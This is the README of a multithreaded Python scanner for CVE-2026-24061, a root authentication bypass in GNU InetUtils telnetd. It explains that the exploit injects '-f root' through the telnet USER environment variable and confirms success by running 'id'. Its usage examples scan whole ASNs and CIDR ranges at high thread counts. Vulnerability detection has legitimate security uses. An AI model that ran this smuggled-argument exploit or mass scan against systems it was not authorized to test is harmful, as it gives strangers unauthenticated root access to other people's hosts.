# 🎯 Twenty-Three Scanner v1.0

**CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass**

A powerful, fast, and elegant scanner for detecting vulnerable telnetd services affected by CVE-2026-24061. Built with pure Python standard library - zero external dependencies required.

[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20macos%20%7C%20windows-lightgrey.svg)](https://github.com/yourusername/twenty-three-scanner)

---

## 📋 Table of Contents

- [Features](#-features)
- [Vulnerability Details](#-vulnerability-details)
- [Installation](#-installation)
- [Usage](#-usage)
- [Examples](#-examples)
- [Demo](#-demo)
- [License](https://github.com/madfxr/Twenty-Three-Scanner/blob/main/LICENSE)
- [Reference](https://lists.gnu.org/archive/html/bug-inetutils/2026-01/msg00004.html)

---

## ✨ Features

- 🚀 **High-Performance Scanning** - Multi-threaded architecture with configurable thread count
- 🌐 **Flexible Target Input** - Support for single IPs, CIDR ranges, ASN lookups, and file-based lists
- 📊 **Real-time Progress** - Beautiful Unicode-based UI with live progress bars
- 🎯 **ASN Intelligence** - Automatic prefix fetching from RADB, BGPView, and HackerTarget APIs
- 💾 **Graceful Interruption** - Ctrl+C handling with automatic result saving
- 📝 **Detailed Logging** - Configurable verbosity levels for debugging
- 🔒 **Safe Scanning** - Built-in limits to prevent accidental massive scans
- 🎨 **Clean Output** - Professional bordered tables with scan summaries
- ⚡ **Zero Dependencies** - Pure Python 3.7+ standard library only

---

## 🔍 Vulnerability Details

**CVE-2026-24061** is a critical authentication bypass vulnerability in GNU Inetutils telnetd that allows unauthenticated remote attackers to gain root access by exploiting the NEW-ENVIRON option handling.

### Affected Versions
- GNU InetUtils since version 1.9.3 up to and including version 2.7.
- Various embedded Linux distributions.
- IoT devices with vulnerable telnetd implementations.

### Attack Vector
The vulnerability exploits improper validation of the `USER` environment variable in the telnet NEW-ENVIRON (RFC 1572) option negotiation, allowing attackers to inject malicious values like `-f root` to bypass authentication.

### CVSS Score
**9.8 (Critical)** - CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

---

## 📦 Installation

```bash
# Clone the Repository
git clone https://github.com/madfxr/Twenty-Three-Scanner.git
cd Twenty-Three-Scanner

# Make Executable
chmod +x twenty-three-scanner.py

# Run the Script
python3 twenty-three-scanner.py -h
```

## 📖 Usage

```bash
usage: python3 twenty-three-scanner.py [-h] [-t TARGET] [-f FILE] [-a ASN] [-p PORT] [--threads N] [--user-value VALUE] [--connect-timeout SEC] [--read-timeout SEC]
                                       [--id-timeout SEC] [--max-hosts-per-cidr N] [--max-total-hosts N] [--skip-large-networks] [-o FILE] [-v]

CVE-2026-24061 - GNU InetUtils Telnetd Remote Authentication Bypass

options:
  -h, --help            show this help message and exit

Target Options:
  -t TARGET, --target TARGET
                        target IP, CIDR, or comma-separated list (can be used multiple times)
  -f FILE, --file FILE  file containing targets (one per line, supports comments with #)
  -a ASN, --asn ASN     autonomous system number (e.g., AS10111 or 10111)

Scan Options:
  -p PORT, --port PORT  target port(s), comma-separated (default: 23)
  --threads N           number of concurrent threads (default: 50)
  --user-value VALUE    USER environment variable value for exploit (default: '-f root')

Timeout Options:
  --connect-timeout SEC
                        TCP connection timeout in seconds (default: 3.0)
  --read-timeout SEC    socket read timeout in seconds (default: 2.0)
  --id-timeout SEC      'id' command response timeout in seconds (default: 2.0)

Limit Options:
  --max-hosts-per-cidr N
                        maximum hosts to scan per CIDR block (default: 1024)
  --max-total-hosts N   maximum total hosts across all targets (default: 50000)
  --skip-large-networks
                        skip networks larger than /16 (avoids accidentally scanning huge ranges)

Output Options:
  -o FILE, --output FILE
                        save vulnerable hosts to file (format: IP:PORT)
  -v, --verbose         enable verbose debug logging
```

## 🧩 Examples
```bash
  # Scan specific ASN with multiple ports
  python3 twenty-three-scanner.py -a AS10111 -p 23,2323 --threads 100
  python3 twenty-three-scanner.py -a 10111 -p 23,2323 --threads 100

  # Scan CIDR range
  python3 twenty-three-scanner.py -t 192.168.23.0/24 -p 23 -o results.txt

  # Scan multiple IPs
  python3 twenty-three-scanner.py -t 10.0.0.1,10.0.0.2,10.0.0.3 -p 23,2323

  # Scan from file
  python3 twenty-three-scanner.py -f targets.txt -p 23 --threads 50 -o output.txt

  # Scan ASN with custom limits
  python3 twenty-three-scanner.py -a AS10111 --max-hosts-per-cidr 2048 --threads 200
```

## 🕹️ Demo
<p align="center">
  <img
    src="https://github.com/user-attachments/assets/0039b53a-9527-4c74-a341-8da6d25af834"
    alt="image"
    style="max-width: 891px; width: 100%;"
  />
</p>
